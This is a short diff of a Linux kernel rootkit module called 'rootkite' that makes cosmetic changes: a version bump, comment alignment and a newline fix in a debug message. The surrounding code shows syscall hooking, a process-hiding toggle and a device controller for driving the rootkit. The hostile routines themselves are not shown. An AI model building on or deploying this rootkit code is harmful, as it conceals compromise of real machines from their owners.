@@ -14,13 +14,13 @@
 MODULE_LICENSE("GPL v2");
 MODULE_DESCRIPTION("rootkite");
 MODULE_AUTHOR("NondairyDig");
-MODULE_VERSION("1.0");
+MODULE_VERSION("2.0");
 
 
 static void cleanup(void){
-    fh_remove_hooks(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE); //cleanup the hooks and revert them
-    cleanup_lists();
-    misc_deregister(&controller); // deregister the device controller
+    fh_remove_hooks(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE); // cleanup the hooks and revert them
+    cleanup_lists();                                  // clean up the linked lists(free allocations)
+    misc_deregister(&controller);                     // deregister the device controller
     if(hide_process_active){
         switch_hide_process();
     }
@@ -40,7 +40,7 @@ static int __init mod_init(void){
 #ifdef KITE_DEBUG
 	pr_info("Activated rootkite, Initializing & Hooking Kill\n");
     #ifdef PTREGS_SYSCALL_STUB
-	pr_info("Running in 64bit mode");
+	pr_info("Running in 64bit mode\n");
     #endif
 #endif
     misc_register(&controller); // register the device for interaction within filesystem
